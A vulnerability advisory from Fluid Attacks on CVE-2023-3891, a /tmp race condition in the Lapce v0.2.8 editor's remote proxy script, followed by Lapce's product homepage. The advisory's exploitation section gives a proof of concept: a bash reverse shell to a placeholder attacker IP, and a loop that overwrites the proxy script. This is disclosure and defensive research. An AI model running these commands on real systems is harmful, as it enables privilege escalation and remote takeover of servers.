=== Content from fluidattacks.com_7c2ebd44_20250111_073220.html ===
[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# Lapce v0.2.8 - Privilege escalation via Race Condition

## Summary

|  |  |
| --- | --- |
| **Name** | Lapce v0.2.8 - Privilege escalation via Race Condition |
| **Code name** | [Aerosmith](https://en.wikipedia.org/wiki/Aerosmith) |
| **Product** | Lapce |
| **Affected versions** | Version 0.2.8 |
| **Fixed Versions** |  |
| **State** | Public |
| **Release date** | 2023-06-01 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Race Condition |
| **Rule** | [124. Race Condition](https://docs.fluidattacks.com/criteria/vulnerabilities/124) |
| **Remote** | No |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H |
| **CVSSv3.1 Base Score** | 7.3 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2023-3891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3891) |

## Description

Lapce v0.2.8 contains a logical vulnerability in its code that could potentially
allow an attacker to escalate their privileges on the server. This vulnerability
arises when downloading a file remotely to a location where an attacker can
manipulate the downloaded file. The issue is attributed to a Race Condition
vulnerability in the code.

## Vulnerability

An identified vulnerability in Lapce v0.2.8 involves Privilege Escalation via a
Race Condition. This vulnerability is the result of multiple bad practices,
making it possible for a user with local network access to compromise the system
and escalate their privileges. The file at the center of this vulnerability is:
`remote.rs`

```
 _ => {
            let local_proxy_script =
                Directory::proxy_directory().unwrap().join("proxy.sh"); // The file is obtained

            let mut proxy_script = std::fs::OpenOptions::new()
                .create(true)
                .write(true)
                .open(&local_proxy_script)?;
            proxy_script.write_all(UNIX_PROXY_SCRIPT)?;

            let remote_proxy_script = "/tmp/lapce-proxy.sh";
            remote.upload_file(local_proxy_script, remote_proxy_script)?; // Here, the file is uploaded to the SSH server. From this point, the attacker needs to overwrite the proxy.sh script.

            let cmd = remote // At this point, the proxy.sh script needs to be overwritten to achieve Privilege Escalation
                .command_builder()
                .args(["chmod", "+x", remote_proxy_script]) // The script is granted execute permissions.
                .output()?;
            debug!("{}", String::from_utf8_lossy(&cmd.stderr));
            debug!("{}", String::from_utf8_lossy(&cmd.stdout));

            let cmd = remote
                .command_builder()
                .args([
                    remote_proxy_script,
                    if meta::VERSION == "debug" {
                        "nightly"
                    } else {
                        meta::VERSION
                    },
                    remote_proxy_path,
                ])
                .output()?; // The script is executed.
            debug!("{}", String::from_utf8_lossy(&cmd.stderr));
            debug!("{}", String::from_utf8_lossy(&cmd.stdout));

            cmd.status
        }

```

At the time of execution, there is no validation of the script's integrity, and
its location in a folder with write permissions for anyone makes it susceptible
to potential overwrites, primarily due to a race condition.

## Exploitation

To exploit this vulnerability, you must first have compromised the server,
either remotely or locally, let's call this "User 1". Then, another user, either
local or remote, with higher privileges, such as the "root" user, attempts to
connect to the server using Lapce. At this point, the script that User 1 is
overwriting will be executed by the "root" user when attempting to connect to
the server.
In summary, you need initial access to the server as User 1 and then wait for
User 2, who has higher privileges, to try to connect using Lapce for the script
to be executed with those privileges.
You must go to the tmp directory and execute the following commands:

```
echo -e "#!/bin/bash\n/bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1" > /tmp/test.sh
while true; do cp /tmp/test.sh /tmp/lapce-proxy.sh || chmod 755 /tmp/lapce-proxy.sh ;done &>/dev/null

```
## Evidence of exploitation

It's important to note that this vulnerability arises due to the downloading of
a file to a directory where any user can write files. If the file is created at
the same time it's being downloaded, it can be overwritten, allowing an attacker
to manipulate the script's original operation and potentially achieve privilege
escalation on the system.
To exploit this vulnerability, simply utilize the provided Proof of Concept
(PoC) code in the console and wait for a user to attempt to log into a remote
server using the SSH service implemented by Lapce. This attack scenario only
occurs if the script is created before Lapce generates it; if it's already
generated, you would need to wait until the temporary content is deleted.
For a more detailed demonstration of the exploitation process, please refer to
the following video."

The significant impact of this vulnerability is the potential for a user to
escalate privileges by executing commands as that user. The following video
demonstrates how this can be achieved:

## Our security policy

We have reserved the ID CVE-2023-3891 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: Lapce v0.2.8 (2023-06-01)
* Operating System: MacOS

## Mitigation

There is a patched code of Lapce is available at Github.

## Credits

The vulnerability was discovered by
[Renzo Machado](https://www.linkedin.com/in/renzo-neomar-machado-50881a235/)
from Fluid Attacks'Offensive Team.

## References

**Vendor page** <https://lapce.dev/>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-08-08

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-08-09

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-08-09

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-08-09

Vendor Confirmed the vulnerability.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-08-19

Vulnerability patched.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-09-18

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)



=== Content from lapce.dev_7be7d7ff_20250111_073220.html ===

[Lapdev](/)

* Dev Tools
* Lapdev Platform
* [About](/about/)
* [Contact Us](/contact/)

* 38.6K

* [lapce/lapdev](https://github.com/lapce/lapdev)
* [lapce/lapce](https://github.com/lapce/lapce)
* [lapce/floem](https://github.com/lapce/floem)

[Dashboard](https://ws.lap.dev/)

[Lapdev](/)

* Dev Tools
* [Lapdev](/)
* [Lapce](/lapce/)
* [Floem](/floem/)
* Lapdev Platform
* [Pricing](/pricing/)
* [Dashboard](https://ws.lap.dev/)
* [Docs](https://docs.lap.dev/)
* [Blog](/blog/)
* [Status](https://status.lap.dev/)
* [About](/about/)
* [Contact Us](/contact/)

[Lapdev
Performant cloud dev environment](/)
[Lapdev Docs](https://docs.lap.dev/)
[Lapdev Blog](/blog/)

[Lapce
Open source code editor](/lapce/)
[Lapce Plugins](https://plugins.lapce.dev/)
[Lapce Docs](https://docs.lapce.dev/)

[Floem
Cross platform GUI toolkit for Rust](/floem/)
[Floem Docs](https://docs.floem.dev/)

[Lapdev Pricing
Find the plans for Lapdev](/pricing/)

[Lapdev Dashboard
Dashboard of Lapdev platform](https://ws.lap.dev/)

[Lapdev Status
Status page of Lapdev platform](https://status.lap.dev/)

[Lapce](/lapce/)
Version 0.4.2

* [Docs](https://docs.lapce.dev/)
* [Plugins](https://plugins.lapce.dev/)
* [Download](#downloads-all)

![](https://raw.githubusercontent.com/lapce/lapce/master/extra/images/logo.png)
# Lightning-fast and Powerful Code Editor

Open source. Quick from launch to every keystroke, and batteries included.

Download

[Other platforms and formats](#downloads-all)

[Read the docs](https://docs.lapce.dev/)

![](https://raw.githubusercontent.com/lapce/lapce/master/extra/images/screenshot.png)

## Modern open source code editor in Rust

Native GUI and Rust powered performance, we as developers know what you need for an essential tool like a code editor. Write code with joy in Lapce.

### Lightning fast

Native GUI with GPU acceleration in [Floem](/floem/), no more waiting on launching the editor, and any lag on your keystroke will be treated as a bug and get fixed.

### Remote Development

You can connect to a remote machine seamlessly, with a "local" experience, benefiting from an identical environment with your production server, or utilizing the full performance of the remote machine. We also have [Lapdev](/) which can help manage your remote dev environments.

### Batteries included

Code syntax highlighting using Tree-sitter, much faster and better than regex based highlighting. Also with built-in LSP support, to give you code intelligence like code completion, diagnostics and code actions etc.

### Vim like modal editing

Vim users, we've got you covered! Built-in support for a Vim like editing experience, without a plugin.

### WASI plugin system

You can write a plugin for Lapce with any programing language that compiles to WASI. Choose a familiar language for writing a plugin without learning a new language.

### Built-in Terminal

Start a terminal at the path of your workspace, without leaving Lapce.

![](/images/linux-logo.png)

.tar.gz

[x86 (64bit)](https://github.com/lapce/lapce/releases/latest/download/lapce-linux-amd64.tar.gz)

.tar.gz

[ARM (64bit)](https://github.com/lapce/lapce/releases/latest/download/lapce-linux-arm64.tar.gz)

![](/images/windows-logo.png)

System Installer

[x86 (64bit)](https://github.com/lapce/lapce/releases/latest/download/Lapce-windows.msi)

Portable

[x86 (64bit)](https://github.com/lapce/lapce/releases/latest/download/Lapce-windows-portable.zip)

![](/images/apple-logo.svg)

.dmg

[Universal](https://github.com/lapce/lapce/releases/latest/download/Lapce-macos.dmg)

[Lapdev](/)

### Dev Tools

* [Lapdev](/)
* [Lapce](/lapce/)
* [Floem](/floem/)

### Lapdev Platform

* [Pricing](/pricing/)
* [Dashboard](https://ws.lap.dev/)
* [Status](https://status.lap.dev/)

### Resources

* [Lapdev Docs](https://docs.lap.dev/)
* [Lapdev Blog](/blog/)
* [Lapce Docs](https://docs.lapce.dev/)
* [Floem Docs](https://docs.floem.dev/)

### Company

* [About](/about/)
* [Contact Us](/contact/)
* [Terms](/terms/)
* [Privacy](/privacy/)


